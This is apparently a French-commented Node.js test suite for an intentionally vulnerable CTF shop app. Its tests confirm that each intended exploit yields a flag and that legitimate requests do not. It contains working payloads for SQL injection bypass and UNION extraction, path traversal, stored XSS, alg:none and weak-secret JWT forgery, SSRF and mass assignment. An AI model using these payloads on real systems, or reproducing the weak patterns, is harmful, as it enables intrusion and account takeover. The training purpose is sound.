// Chaque challenge est vérifié DEUX fois : le chemin prévu doit donner le flag,
// et un chemin voisin ne doit rien donner. C'est le seul moyen de garder les
// scénarios étanches dans la durée — un test qui ne vérifie que le chemin prévu
// laisse revenir les validations par effet de bord.
const test = require('node:test');
const assert = require('node:assert/strict');
const jwt = require('jsonwebtoken');

const { startServer, client, externalAddress } = require('./helpers');
const { FLAGS } = require('../src/flags');
const { CHALLENGES } = require('../../shared/flags.json');

// Le fil rouge est satisfait par défaut : chaque test cible SON challenge, pas
// ses prérequis, qui ont leur propre test.
const ALL_CAPTURED = CHALLENGES.map((c) => c.flagId);

async function withServer(options, fn) {
  const server = await startServer(options);
  try {
    await fn(client(server.base), server);
  } finally {
    await server.stop();
  }
}

const login = (api, username = 'john', password = 'john123') =>
  api.post('/api/auth/login', { username, password });

test('Sensitive Data Exposure : l\'endpoint de debug délivre le flag', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const { data } = await api.get('/api/config');
    assert.equal(data.flag, FLAGS.DATA_EXPOSURE);
  });
});

test('IDOR : le profil d\'un autre utilisateur est lisible', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const { data } = await api.get('/api/users/3');
    assert.match(data.bio, /ASY\{/, 'la bio porteuse du flag doit être exposée');
  });
});

test('Path Traversal : le flag vient du fichier hors dossier, pas d\'une image normale', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const attack = await api.get('/api/products/image?file=../../secret_flag.txt');
    assert.equal(attack.data.flag, FLAGS.PATH_TRAVERSAL);

    const normal = await api.get('/api/products/image?file=banana.svg');
    assert.equal(normal.data.flag, undefined, 'une lecture légitime ne donne pas de flag');
  });
});

test('Zero Rating : une note hors intervalle donne le flag, une note valide non', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const attack = await api.post('/api/products/1/reviews', { content: 'Bof', rating: 0 });
    assert.equal(attack.data.flag, FLAGS.ZERO_RATING);

    const normal = await api.post('/api/products/1/reviews', { content: 'Très bien', rating: 4 });
    assert.equal(normal.data.flag, undefined);
  });
});

test('Un seul flag par requête : XSS stockée + note 0 ne valident pas deux challenges', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const { data } = await api.post('/api/products/1/reviews', {
      content: '<img src=x onerror="alert(1)">',
      rating: 0,
    });
    assert.equal(data.flag, FLAGS.STORED_XSS, 'le plus spécifique l\'emporte');
    assert.notEqual(data.flag, FLAGS.ZERO_RATING);
  });
});

test('SQL Injection : le bypass donne le flag, un login légitime non', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const attack = await api.post('/api/auth/login', { username: "admin' -- ", password: 'peu importe' });
    assert.equal(attack.data.flag, FLAGS.SQLI);

    const legit = await api.post('/api/auth/login', { username: 'john', password: 'john123' });
    assert.equal(legit.data.flag, undefined, 'un mot de passe correct ne prouve aucune injection');
  });
});

test('SQL Injection UNION : erreur SQL exposée, puis flag sur extraction réelle', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const probe = await api.get('/api/products?search=' + encodeURIComponent("' UNION SELECT 1 -- "));
    assert.equal(probe.status, 500);
    assert.match(probe.data.error, /SQL error/, 'l\'erreur SQL est le signal du premier temps');

    const union = await api.get(
      '/api/products?search=' + encodeURIComponent("' UNION SELECT 1,value,3,4,5,6 FROM secrets -- ")
    );
    assert.equal(union.data.flag, FLAGS.SQLI_UNION);

    const normal = await api.get('/api/products?search=banane');
    assert.equal(normal.data.flag, undefined);
  });
});

test('Logique métier : le virement négatif donne le flag, pas un solde élevé', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const attack = await api.post('/api/credits/send', { recipientUsername: 'admin', amount: -5000 });
    assert.equal(attack.data.flag, FLAGS.BUSINESS_LOGIC);
  });
});

test('Logique métier : un solde > 999 obtenu par l\'admin ne valide rien (chemin non prévu)', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    // L'admin crédite un compte : c'est le scénario qui validait le challenge.
    await login(api, 'admin', 'SuperSecretAdmin123!');
    await api.put('/api/admin/users/2', { balance: 10000 });

    const victim = client(api.base);
    await login(api, 'john', 'john123');
    const transfer = await api.post('/api/credits/send', { recipientUsername: 'admin', amount: 30 });

    assert.equal(transfer.data.flag, undefined, 'un virement ordinaire ne prouve aucune exploitation');
    assert.match(transfer.data.message, /pas le chemin de ce challenge/);
    assert.ok(victim);
  });
});

test('Mass Assignment : premium et rôle admin donnent deux flags distincts', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const premium = await api.put('/api/users/2', { subscription: 'premium' });
    assert.equal(premium.data.flag, FLAGS.MASS_ASSIGNMENT);

    const role = await api.put('/api/users/2', { role: 'admin' });
    assert.equal(role.data.flag, FLAGS.PRIV_ESC_ROLE);
  });
});

test('Mass Assignment : un rôle inconnu est refusé', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const { status, data } = await api.put('/api/users/2', { role: 'tartanpion' });
    assert.equal(status, 400);
    assert.equal(data.flag, undefined);
  });
});

test('JWT Forging : un jeton forgé alg:none donne le flag, un jeton légitime non', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api, 'admin', 'SuperSecretAdmin123!');
    const legit = await api.get('/api/admin/dashboard');
    assert.equal(legit.data.flag, undefined, 'un admin légitime n\'a pas forgé son jeton');

    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const payload = Buffer.from(
      JSON.stringify({ id: 1, username: 'admin', role: 'admin', super_admin: true })
    ).toString('base64url');
    api.setCookie('token', `${header}.${payload}.`);

    const forged = await api.get('/api/admin/dashboard');
    assert.equal(forged.data.flag, FLAGS.JWT_FORGING);
  });
});

test('JWT Forging : le secret faible permet aussi de signer un super_admin', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const token = jwt.sign(
      { id: 1, username: 'admin', role: 'admin', super_admin: true },
      'secret-pass-to-change'
    );
    api.setCookie('token', token);
    const { data } = await api.get('/api/admin/dashboard');
    assert.equal(data.flag, FLAGS.JWT_FORGING);
  });
});

test('SSRF : l\'endpoint interne n\'est atteignable que par le serveur lui-même', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api, server) => {
    await login(api);
    const ssrf = await api.post('/api/products/1/image-url', {
      url: `${server.base}/api/internal/flag`,
    });
    assert.equal(ssrf.data.data.flag, FLAGS.SSRF);

    // Depuis une adresse non-loopback — ce qu'est le navigateur d'un participant.
    const external = externalAddress();
    if (external) {
      const port = new URL(server.base).port;
      const direct = await fetch(`http://${external}:${port}/api/internal/flag`);
      assert.equal(direct.status, 403, 'un accès direct ne doit pas délivrer le flag');
    }
  });
});

test('Vol de cookie : le jeton dédié exfiltré depuis un navigateur, et rien d\'autre', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    await login(api);
    const secret = api.cookie('ctf_secret');
    assert.ok(secret, 'le cookie dédié doit être posé à la connexion');

    const browser = await api.post('/api/xss-flag/cookie', {
      value: secret,
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0',
      referer: 'http://bananashop/product/3',
    });
    assert.equal(browser.data.flag, FLAGS.COOKIE_THEFT);

    const cli = await api.post('/api/xss-flag/cookie', {
      value: secret,
      userAgent: 'curl/8.5.0',
      referer: 'http://bananashop/',
    });
    assert.equal(cli.data.flag, undefined, 'un curl manuel ne prouve aucune XSS');

    const jwtValue = await api.post('/api/xss-flag/cookie', {
      value: api.cookie('token'),
      userAgent: 'Mozilla/5.0 Firefox/128.0',
      referer: 'http://bananashop/',
    });
    assert.equal(jwtValue.data.flag, undefined, 'un JWT quelconque ne vaut plus validation');
  });
});

test('Fil rouge : un challenge à prérequis ne se valide pas hors de son ordre', async () => {
  await withServer({ captured: [] }, async (api) => {
    const { data } = await api.post('/api/auth/login', { username: "admin' -- ", password: 'x' });
    assert.equal(data.flag, undefined, 'SQLi exige IDOR au préalable');
    assert.match(data.message, /fil rouge/);
  });
});

test('Fil rouge : la soumission refuse aussi un flag hors parcours', async () => {
  await withServer({ captured: [] }, async (api) => {
    const { status, data } = await api.post('/api/flags/submit', { flag: FLAGS.SQLI });
    assert.equal(status, 400);
    assert.equal(data.valid, false);
    assert.match(data.error, /fil rouge/);
  });
});

test('Soumission : un flag collé avec ses guillemets JSON est accepté', async () => {
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const { data } = await api.post('/api/flags/submit', { flag: `"${FLAGS.DATA_EXPOSURE}",` });
    assert.equal(data.valid, true);
    assert.equal(data.flagId, 'DATA_EXPOSURE');
  });
});

test('Soumission : un challenge désactivé ne rapporte rien', async () => {
  const disabled = CHALLENGES.find((c) => !c.enabled);
  if (!disabled) return;
  await withServer({ captured: ALL_CAPTURED }, async (api) => {
    const { status, data } = await api.post('/api/flags/submit', { flag: FLAGS[disabled.flagId] });
    assert.equal(status, 400);
    assert.equal(data.valid, false);
  });
});

test('Détection : une technique employée au mauvais endroit oriente, sans flag', async () => {
  process.env.DETECTION_MESSAGES = 'on';
  try {
    await withServer({ captured: ALL_CAPTURED }, async (api) => {
      const { data } = await api.post('/api/auth/register', {
        username: '<img src=x onerror=alert(1)>',
        password: 'p',
      });
      assert.ok(data.nudge, 'un message d\'orientation doit être renvoyé');
      assert.equal(data.flag, undefined, 'la détection ne délivre jamais de flag');
    });
  } finally {
    process.env.DETECTION_MESSAGES = 'off';
  }
});

test('Tous les challenges activés ont un indice, une orientation et des prérequis connus', () => {
  const ids = new Set(CHALLENGES.map((c) => c.flagId));
  for (const challenge of CHALLENGES) {
    assert.ok(FLAGS[challenge.flagId], `${challenge.flagId} n'a pas de flag`);
    assert.ok(challenge.hint, `${challenge.flagId} n'a pas d'indice`);
    assert.ok(challenge.nudge, `${challenge.flagId} n'a pas d'orientation`);
    for (const required of challenge.requires || []) {
      assert.ok(ids.has(required), `${challenge.flagId} dépend d'un challenge inconnu: ${required}`);
    }
  }
});
